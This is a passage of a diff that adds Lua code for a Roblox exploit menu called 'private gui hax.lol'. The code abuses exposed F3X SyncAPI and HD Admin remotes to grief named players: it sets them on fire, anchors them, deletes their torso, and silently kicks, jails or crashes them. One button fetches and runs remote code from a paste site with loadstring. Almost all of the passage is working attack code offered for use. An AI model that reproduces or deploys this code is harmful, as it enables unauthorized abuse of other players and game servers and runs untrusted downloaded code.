+			serverendpoint:InvokeServer("SyncAnchor", { { Part = duckPart, Anchored = true } })
+			serverendpoint:InvokeServer("SetLocked", { [1] = duckPart }, true)
+	
+			-- Epic Duck Mesh
+			serverendpoint:InvokeServer("CreateMeshes", { { Part = duckPart } })
+			serverendpoint:InvokeServer("SyncMesh", { 
+				{ 
+					Part = duckPart, 
+					MeshId = "rbxassetid://11746543477",
+					TextureId = "rbxassetid://0",
+					Scale = duckScale 
+				} 
+			})
+	
+			task.wait(0.5)  -- Replication wait
+	
+			-- === YELLOW SPARKLES ===
+			local sparkles = Instance.new("Sparkles")
+			sparkles.SparkleColor = Color3.fromRGB(255, 255, 0)
+			sparkles.Enabled = false
+			sparkles.Parent = duckPart
+	
+	
+			quackSound = Instance.new("Sound")
+			quackSound.SoundId = "rbxassetid://0"  
+			quackSound.Volume = 0.6
+			quackSound.RollOffMode = Enum.RollOffMode.Linear
+			quackSound.Parent = duckPart
+	
+			-- === HEAD TITLE ===
+			local billboardGui = Instance.new("BillboardGui")
+			billboardGui.Name = "DuckHeadTitle"
+			billboardGui.Size = UDim2.new(0, 0, 0, 0)
+			billboardGui.StudsOffset = Vector3.new(0, 1.6, 1.1)
+			billboardGui.AlwaysOnTop = true
+			billboardGui.LightInfluence = 0
+			billboardGui.Parent = duckPart
+	
+			local textLabel = Instance.new("TextLabel")
+			textLabel.Size = UDim2.new(0, 0, 0, 0)
+			textLabel.BackgroundTransparency = 1
+			textLabel.Text = TITLE
+			textLabel.TextColor3 = Color3.fromRGB(35, 71, 139)
+			textLabel.TextStrokeTransparency = 0
+			textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+			textLabel.Font = Enum.Font.GothamBold
+			textLabel.TextSize = 13
+			textLabel.Parent = billboardGui
+	
+			ContentProvider:PreloadAsync({duckPart})
+	
+	
+		end
+	
+		local function startOrbit()
+			if connection then connection:Disconnect() end
+	
+			local character = player.Character
+			if not character or not character:FindFirstChild("HumanoidRootPart") or not duckPart then return end
+	
+			local humanoidRootPart = character.HumanoidRootPart
+	
+			connection = RunService.RenderStepped:Connect(function()
+				if not humanoidRootPart.Parent or not duckPart or not duckPart.Parent then return end
+	
+				local time = tick()
+				local angle = time * speed
+	
+				local offset = Vector3.new(math.cos(angle) * radius, heightOffset, math.sin(angle) * radius)
+				local position = humanoidRootPart.Position + offset
+	
+				local lookDirection = humanoidRootPart.CFrame.LookVector
+				local targetPos = position + lookDirection
+				local duckCFrame = CFrame.lookAt(position, targetPos)
+	
+				-- Little bob up/down + QUACK on bob!
+				local bobHeight = math.sin(time * 0.5) * 0.99
+				duckCFrame = CFrame.new(duckCFrame.Position + Vector3.new(0, bobHeight, 0), targetPos)
+	
+				-- QUACK SOUND every full orbit cycle
+				if math.abs(bobHeight) > 0.35 and quackSound then
+					quackSound:Play()
+				end
+	
+				duckPart.CFrame = duckCFrame
+			end)
+		end
+	
+		player.CharacterAdded:Connect(function()
+			task.wait(1.5)
+			createDuck()
+			task.wait(0.5)
+			startOrbit()
+		end)
+	
+		if player.Character then
+			createDuck()
+			task.wait(0.5)
+			startOrbit()
+		end
+	
+		print("epik")
+		print("orbit duck skiddd ")
+	end)
+end;
+task.spawn(C_241);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_243()
+local script = G2L["243"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed and smooth by elv4r0x original by InnocentPlayer
+		
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local root = char:WaitForChild("HumanoidRootPart")
+	
+		local tool
+		for _,v in ipairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			error("SyncAPI not found")
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function Invoke(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local blackSize = Vector3.new(2.7, 3.7, 0.05)
+		local redSize = Vector3.new(2.4, 3.4, 0.2)
+		local decalSize = Vector3.new(4.5, 4.5, 0.01)
+	
+		local blackColor = Color3.new(0, 0, 0)
+		local redColor = Color3.new(1, 0, 0)
+	
+		local function SetAnchor(part, state)
+			Invoke({ "SyncAnchor", {{ Part = part, Anchored = state }} })
+		end
+	
+		local function SetCollision(part, state)
+			Invoke({ "SyncCollision", {{ Part = part, CanCollide = state }} })
+		end
+	
+		local function SetName(part, name)
+			Invoke({ "SetName", {part}, name })
+		end
+	
+		local MyOutputFunc = {}
+	
+		local function BuildFrameStructure(name, isFrontFrame)
+			local cf = CFrame.new(0, 500, 0)
+	
+			local data = {
+				Outer = nil,
+				Inner = nil,
+				DecalPart = nil,
+				IsFront = isFrontFrame
+			}
+			table.insert(MyOutputFunc, data)
+	
+			task.defer(function()
+				local durham, outer = pcall(function()
+					return remote:InvokeServer("CreatePart", "Normal", cf, char)
+				end)
+				if durham and outer then
+					data.Outer = outer
+					SetAnchor(outer, true)
+					SetCollision(outer, false)
+					SetName(outer, name.."_Outer")
+					Invoke({ "CreateMeshes", {{ Part = outer }} })
+					Invoke({ "SyncMesh", {{ Part = outer, MeshType = Enum.MeshType.FileMesh, MeshId = "rbxassetid://1546845741", TextureId = "", Scale = Vector3.new(2.3, 3, 3.3) }} })
+					Invoke({ "SyncResize", {{ Part = outer, Size = blackSize, CFrame = cf }} })
+					Invoke({ "SyncColor", {{ Part = outer, Color = blackColor, UnionColoring = false }} })
+				end
+			end)
+	
+			task.defer(function()
+				local durham, inner = pcall(function()
+					return remote:InvokeServer("CreatePart", "Normal", cf, char)
+				end)
+				if durham and inner then
+					data.Inner = inner
+					SetAnchor(inner, true)
+					SetCollision(inner, false)
+					SetName(inner, name.."_Inner")
+					Invoke({ "SyncResize", {{ Part = inner, Size = redSize, CFrame = cf }} })
+					Invoke({ "SyncColor", {{ Part = inner, Color = redColor, UnionColoring = false }} })
+					Invoke({ "SyncMaterial", {{ Part = inner, Material = Enum.Material.Plastic, Transparency = 0.3, Reflectance = 0 }} })
+				end
+			end)
+	
+			if isFrontFrame then
+				task.defer(function()
+					local durham, decalPart = pcall(function()
+						return remote:InvokeServer("CreatePart", "Normal", cf, char)
+					end)
+					if durham and decalPart then
+						data.DecalPart = decalPart
+						SetAnchor(decalPart, true)
+						SetCollision(decalPart, false)
+						SetName(decalPart, name.."_DecalSingle")
+	
+						Invoke({ "SyncResize", {{ Part = decalPart, Size = decalSize, CFrame = cf }} })
+						Invoke({ "SyncMaterial", {{ Part = decalPart, Material = Enum.Material.Plastic, Transparency = 1, Reflectance = 0 }} })
+	
+						Invoke({ "CreateTextures", {{ Part = decalPart, TextureType = "Decal", Face = Enum.NormalId.Front }} })
+						Invoke({ "SyncTexture", {{ Part = decalPart, TextureType = "Decal", Face = Enum.NormalId.Front, Texture = "rbxassetid://113228369199809" }} })
+	
+						Invoke({ "CreateTextures", {{ Part = decalPart, TextureType = "Decal", Face = Enum.NormalId.Back }} })
+						Invoke({ "SyncTexture", {{ Part = decalPart, TextureType = "Decal", Face = Enum.NormalId.Back, Texture = "rbxassetid://113228369199809" }} })
+					end
+				end)
+			end
+		end
+	
+		task.defer(function()
+			BuildFrameStructure("Frame1", false)
+		end)
+	
+		task.defer(function()
+			task.wait(0.05)
+			BuildFrameStructure("Frame2", true)
+		end)
+	
+		local outerRotationOffset = { X = 90, Y = 0, Z = 0 }
+		local rotation = 0
+		local SmoothPositions = {}
+	
+		for i = 1, 2 do
+			SmoothPositions[i] = CFrame.new(root.Position)
+		end
+	
+		RunService.RenderStepped:Connect(function(deltaTime)
+			if not root or #MyOutputFunc == 0 then return end
+	
+			rotation = rotation + 0.0001
+			local count = #MyOutputFunc
+			local radius = 5 + (count * 0.5)
+	
+			task.defer(function()
+				local movelol = {}
+	
+				for i = 1, count do
+					local data = MyOutputFunc[i]
+					if not data then continue end
+	
+					local outer = data.Outer
+					local inner = data.Inner
+					local decalPart = data.DecalPart
+	
+					local x = math.cos((i / count - (0.5 / count) + rotation * 2) * math.pi * 2) * radius
+					local y = 0
+					local z = math.sin((i / count - (0.5 / count) + rotation * 2) * math.pi * 2) * radius
+	
+					local worldPos = root.CFrame:PointToWorldSpace(Vector3.new(x, y, z))
+					local targetCF = CFrame.new(worldPos, root.Position) * CFrame.Angles(math.rad(25), 0, 0)
+	
+					local currentCF = SmoothPositions[i] or targetCF
+					currentCF = currentCF:Lerp(targetCF, math.clamp(deltaTime * 12, 0, 1))
+					SmoothPositions[i] = currentCF
+	
+					if outer and outer.Parent then
+						local outerCF = currentCF * CFrame.Angles(math.rad(outerRotationOffset.X), math.rad(outerRotationOffset.Y), math.rad(outerRotationOffset.Z))
+						table.insert(movelol, { Part = outer, CFrame = outerCF })
+					end
+	
+					if inner and inner.Parent then
+						table.insert(movelol, { Part = inner, CFrame = currentCF })
+					end
+	
+					if decalPart and decalPart.Parent then
+						local decalCF = CFrame.new(worldPos, root.Position) * CFrame.new(0, 5.5, 1)
+						table.insert(movelol, { Part = decalPart, CFrame = decalCF })
+					end
+				end
+	
+				if #movelol > 0 then
+					pcall(function()
+						remote:InvokeServer("SyncMove", movelol)
+					end)
+				end
+			end)
+		end)
+	end)
+end;
+task.spawn(C_243);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_245()
+local script = G2L["245"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed by elv4r0x (orig by InnocentPlayer)
+		
+		local durham = game.Players.LocalPlayer
+		local poop = durham.Character or durham.CharacterAdded:Wait()
+		local hahafunni = poop:WaitForChild("HumanoidRootPart")
+		local koopkidd = poop:WaitForChild("Head")
+		local Nilizer = game:GetService("RunService")
+	
+		local hack
+		for _,v in ipairs(durham:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				hack = v.Parent
+				break
+			end
+		end
+		if not hack then
+			for _,v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					hack = v.Parent
+					break
+				end
+			end
+		end
+	
+		local funnihacker = hack.SyncAPI.ServerEndpoint
+		local f3xhax = game.ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		local function lulz(args)
+			task.defer(function()
+				pcall(function()
+					funnihacker:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local koopkiddPos = CFrame.new(0,99999,0)
+		f3xhax:InvokeServer(";titleg me All Output Function Work.")
+	
+		local f3xhaxPart1 = funnihacker:InvokeServer("CreatePart","Normal",koopkiddPos,workspace)
+		local f3xhaxPart2 = funnihacker:InvokeServer("CreatePart","Ball",koopkiddPos,workspace)
+		local f3xhaxOrb = funnihacker:InvokeServer("CreatePart","Ball",koopkiddPos,workspace)
+	
+		lulz({"SyncResize",{
+			{Part = f3xhaxPart1, Size = Vector3.new(1,1,1), CFrame = koopkiddPos},
+			{Part = f3xhaxPart2, Size = Vector3.new(1.6,1.6,1.6), CFrame = koopkiddPos},
+			{Part = f3xhaxOrb, Size = Vector3.new(1.1,1.1,1.1), CFrame = koopkiddPos}
+		}})
+	
+		lulz({"SyncColor",{
+			{Part = f3xhaxPart1, Color = Color3.fromRGB(0,255,0)},
+			{Part = f3xhaxPart2, Color = Color3.fromRGB(0,255,0)}
+		}})
+	
+		lulz({"SyncMaterial",{
+			{Part = f3xhaxPart2, Transparency = 0.45},
+			{Part = f3xhaxOrb, Transparency = 1}
+		}})
+	
+		lulz({"CreateMeshes",{
+			{Part = f3xhaxPart1},
+			{Part = f3xhaxPart2}
+		}})
+	
+		task.wait(0.03)
+	
+		lulz({"SyncMesh",{
+			{Part = f3xhaxPart1, MeshType = Enum.MeshType.FileMesh, MeshId = "rbxassetid://9697765196", Scale = Vector3.new(0.85,0.85,0.85)},
+			{Part = f3xhaxPart2, MeshType = Enum.MeshType.Sphere}
+		}})
+	
+		funnihacker:InvokeServer("Clone",{koopkidd},f3xhaxOrb)
+		task.wait(0.05)
+		local clonedHead = f3xhaxOrb:FindFirstChild("Head")
+		f3xhax:InvokeServer(";untitle")
+	
+		for _,p in ipairs({f3xhaxPart1,f3xhaxPart2,f3xhaxOrb,clonedHead}) do
+			if p then
+				lulz({"SyncAnchor",{{Part = p, Anchored = true}}})
+				lulz({"SyncCollision",{{Part = p, CanCollide = false}}})
+				lulz({"SetLocked",{p},true})
+			end
+		end
+	
+		if clonedHead then
+			lulz({"SyncMaterial",{{Part = clonedHead, Transparency = 1}}})
+			local face = clonedHead:FindFirstChild("face")
+			if face then lulz({"Remove",{face}}) end
+		end
+	
+		local startTime = tick()
+		local dropDuration = 2
+		local orbitDuration = 20
+		local radius = 5
+		local connection
+	
+		connection = Nilizer.Heartbeat:Connect(function()
+			if not hahafunni.Parent then
+				connection:Disconnect()
+				return
+			end
+			local elapsed = tick() - startTime
+			local angle = elapsed * 0.8
+			local x = math.cos(angle) * radius
+			local z = math.sin(angle) * radius
+			local y
+			if elapsed <= dropDuration then
+				local alpha = math.clamp(elapsed / dropDuration, 0, 1)
+				local smooth = 1 - ((1 - alpha)^3)
+				y = 10 + (0.6 - 10) * smooth
+			else
+				local orbitTime = elapsed - dropDuration
+				y = 0.6 + math.sin(orbitTime * 2) * 0.25
+			end
+			local pos = hahafunni.Position + Vector3.new(x,y,z)
+			local finalCF = CFrame.new(pos) * CFrame.Angles(0, elapsed, 0)
+			local moveTbl = {
+				{Part = f3xhaxPart1, CFrame = finalCF},
+				{Part = f3xhaxPart2, CFrame = finalCF},
+				{Part = f3xhaxOrb, CFrame = finalCF}
+			}
+			if clonedHead then
+				table.insert(moveTbl, {Part = clonedHead, CFrame = finalCF})
+			end
+			lulz({"SyncMove",moveTbl})
+			if elapsed >= (dropDuration + orbitDuration) then
+				connection:Disconnect()
+				local removeTbl = {f3xhaxPart1, f3xhaxPart2, f3xhaxOrb}
+				if clonedHead then table.insert(removeTbl, clonedHead) end
+				lulz({"Remove",removeTbl})
+			end
+		end)
+	end)
+end;
+task.spawn(C_245);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_247()
+local script = G2L["247"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastefy.app/Om47ol5O/raw"))() 
+	end)
+end;
+task.spawn(C_247);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_24a()
+local script = G2L["24a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+	end)
+end;
+task.spawn(C_24a);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_251()
+local script = G2L["251"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local pooop = game:GetService("Players")
+		local hax = game:GetService("RunService")
+		local hacklolz = game:GetService("ReplicatedStorage")
+	
+		local rc7 = pooop.LocalPlayer
+		local blue2skidders = rc7.Character or rc7.CharacterAdded:Wait()
+		local koopkoid = blue2skidders:WaitForChild("HumanoidRootPart")
+	
+		local c00l = rc7:FindFirstChild("SyncAPI", true) or hacklolz:FindFirstChild("SyncAPI", true)
+		local hax2 = c00l.ServerEndpoint
+	
+		local function invokeSync(args)
+			pcall(function()
+				hax2:InvokeServer(unpack(args))
+			end)
+		end
+	
+		local BACK_DISTANCE = 1.5
+		local HEIGHT_OFFSET = 7
+		local SPIN_SPEED = 250
+	
+		local rawPartsData = {
+			{pos = Vector3.new(7.17, 0.5, -8.05), rot = Vector3.new(0, 180, 90), size = Vector3.new(1, 8.5, 1)},
+			{pos = Vector3.new(14.42, 14.5, -8.05), rot = Vector3.new(0, 180, -90), size = Vector3.new(1, 8, 1)},
+			{pos = Vector3.new(3.42, 11, -8.05), rot = Vector3.new(0, 180, 0), size = Vector3.new(1, 8, 1)},
+			{pos = Vector3.new(17.42, 4, -8.05), rot = Vector3.new(0, 180, 0), size = Vector3.new(1, 8, 1)},
+			{pos = Vector3.new(10.42, 7.5, -8.05), rot = Vector3.new(0, 0, 90), size = Vector3.new(1, 15, 1)},
+			{pos = Vector3.new(10.92, 7.25, -8.05), rot = Vector3.new(0, -105.002998, 0), size = Vector3.new(1, 15.5, 1)}
+		}
+	
+		local centerPos = Vector3.new(0, 0, 0)
+		for _, d in ipairs(rawPartsData) do
+			centerPos += d.pos
+		end
+		centerPos /= #rawPartsData
+	
+		local pos_st = koopkoid.CFrame
+	
+		local bef = {}
+		for _, v in ipairs(blue2skidders:GetChildren()) do
+			bef[v] = true
+		end
+	
+		task.defer(function()
+			for i = 1, #rawPartsData do
+				task.defer(function()
+					invokeSync({"CreatePart", "Normal", pos_st, blue2skidders})
+				end)
+			end
+		end)
+	
+		task.wait(0.5)
+	
+		local createdParts = {}
+		for _, v in ipairs(blue2skidders:GetChildren()) do
+			if v:IsA("BasePart") and v.Name == "Part" and not bef[v] then
+				table.insert(createdParts, v)
+			end
+		end
+	
+		if #createdParts < #rawPartsData then
+			warn("Not all parts were created: " .. #createdParts .. "/" .. #rawPartsData)
+		end
+	
+		task.defer(function()
+			local bt_resize, bt_color, bt_material, bt_property = {}, {}, {}, {}
+			for index, data in ipairs(rawPartsData) do
+				local p = createdParts[index]
+				if p and p.Parent then
+					table.insert(bt_resize, {Part = p, CFrame = pos_st, Size = data.size})
+					table.insert(bt_color, {Part = p, Color = Color3.fromRGB(255, 255, 255)})
+					table.insert(bt_material, {Part = p, Material = Enum.Material.Neon})
+					table.insert(bt_property, {Part = p, Anchored = true, CanCollide = false})
+				end
+			end
+	
+			if #bt_resize > 0 then
+				invokeSync({"SyncResize", bt_resize})
+				invokeSync({"SyncColor", bt_color})
+				invokeSync({"SyncMaterial", bt_material})
+				invokeSync({"SyncAnchor", bt_property})
+				invokeSync({"SyncCollision", bt_property})
+			end
+		end)
+	
+		local currentAngle = 0
+		local heartbeatConnection
+	
+		heartbeatConnection = hax.Heartbeat:Connect(function(deltaTime)
+			pcall(function()
+				if not blue2skidders or not blue2skidders.Parent then
+					heartbeatConnection:Disconnect()
+					return
+				end
+	
+				if not blue2skidders:FindFirstChild("HumanoidRootPart") then
+					return
+				end
+	
+				currentAngle = (currentAngle + (SPIN_SPEED * deltaTime)) % 360
+	
+				local lookVector = koopkoid.CFrame.LookVector
+				local flatLook = Vector3.new(lookVector.X, 0, lookVector.Z).Unit
+	
+				if flatLook.Magnitude < 0.001 then
+					flatLook = Vector3.new(1, 0, 0)
+				end
+	
+				local wheelCenterPos = koopkoid.Position - (flatLook * BACK_DISTANCE) + Vector3.new(0, HEIGHT_OFFSET, 0)
+	
+				local rightVector = Vector3.new(0, 1, 0):Cross(flatLook).Unit
+				if rightVector.Magnitude < 0.001 then
+					rightVector = Vector3.new(1, 0, 0)
+				end
+	
+				local upVector = flatLook:Cross(rightVector).Unit
+	
+				local baseCFrame = CFrame.fromMatrix(wheelCenterPos, rightVector, upVector, flatLook) * CFrame.Angles(0, 0, math.rad(180))
+				local wheelRotation = CFrame.Angles(0, 0, math.rad(currentAngle))
+	
+				local moveArgs = {}
+				local hasValidParts = false
+	
+				for index, data in ipairs(rawPartsData) do
+					local p = createdParts[index]
+					if p and p.Parent and p:IsA("BasePart") then
+						local offset = data.pos - centerPos
+						local originalRot = CFrame.fromEulerAnglesXYZ(math.rad(data.rot.X), math.rad(data.rot.Y), math.rad(data.rot.Z))
+						local finalCFrame = baseCFrame * wheelRotation * CFrame.new(offset) * originalRot
+	
+						table.insert(moveArgs, {Part = p, CFrame = finalCFrame})
+						hasValidParts = true
+					end
+				end
+	
+				if hasValidParts and #moveArgs > 0 then
+					invokeSync({"SyncMove", moveArgs})
+				end
+			end)
+		end)
+	end)
+end;
+task.spawn(C_251);
+-- StarterGui.private gui hax.lol.ScriptHub F3X tab.LocalScript
+function C_25e()
+local script = G2L["25e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = true
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_25e);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_262()
+local script = G2L["262"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local function get()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, target in pairs(Players:GetPlayers()) do
+			if target.Name == who then
+				local char = target.Character
+				if char then
+					for _, v in pairs(char:GetDescendants()) do
+						if v:IsA("BasePart") and v.Name ~= "Terrain" then
+							task.spawn(function()
+								call("CreateDecorations", { {
+									Part = v,
+									DecorationType = "Fire"
+								} })
+								call("SyncDecorate", { {
+									Part = v,
+									DecorationType = "Fire",
+									Size = 1000,
+									Color = Color3.new(1, 0.5, 0),
+									SecondaryColor = Color3.new(1, 0.1, 0)
+								} })
+							end)
+						end
+					end
+				end
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_262);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_264()
+local script = G2L["264"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local function get()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, target in pairs(Players:GetPlayers()) do
+			if target.Name == who then
+				local char = target.Character
+				if char then
+					for _, v in pairs(char:GetDescendants()) do
+						if v:IsA("BasePart") then
+							task.spawn(function()
+								call("SyncAnchor", { { Part = v, Anchored = true } })
+							end)
+						end
+					end
+				end
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_264);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_266()
+local script = G2L["266"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local function get()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, target in pairs(Players:GetPlayers()) do
+			if target.Name == who then
+				local char = target.Character
+				if char then
+					for _, v in pairs(char:GetDescendants()) do
+						if v:IsA("BasePart") then
+							task.spawn(function()
+								call("SyncAnchor", { { Part = v, Anchored = false } })
+							end)
+						end
+					end
+				end
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_266);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_268()
+local script = G2L["268"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local rs = game:GetService("ReplicatedStorage")
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";walkspeed " .. koop.Name .. " 50")
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_268);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_26a()
+local script = G2L["26a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";r6 " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_26a);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_26c()
+local script = G2L["26c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";re " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_26c);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_26e()
+local script = G2L["26e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local function get()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				local char = koop.Character
+				if char then
+					local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
+					if torso then
+						call("Remove", { torso })
+					end
+				end
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_26e);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_270()
+local script = G2L["270"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";kick " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_270);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_272()
+local script = G2L["272"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";jail " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_272);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_274()
+local script = G2L["274"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";unjail " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_274);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_276()
+local script = G2L["276"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local rs = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+	
+		local who = script.Parent.Parent.TextBoxPlayer.Text
+	
+		local hd = rs:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		for _, koop in pairs(Players:GetPlayers()) do
+			if koop.Name == who then
+				hd:InvokeServer(";crash " .. koop.Name)
+				break
+			end
+		end
+	end)
+end;
+task.spawn(C_276);
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+function C_278()
+local script = G2L["278"];
